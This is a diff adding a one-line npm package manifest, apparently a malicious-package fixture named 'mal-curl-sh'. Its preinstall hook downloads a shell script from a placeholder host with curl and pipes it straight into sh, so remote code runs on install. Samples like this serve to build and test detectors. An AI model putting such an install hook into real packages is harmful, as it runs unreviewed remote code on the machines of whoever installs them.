@@ -1,0 +1,1 @@
+{"name":"mal-curl-sh","version":"1.0.0","scripts":{"preinstall":"curl -s https://example.invalid/x.sh | sh"}}
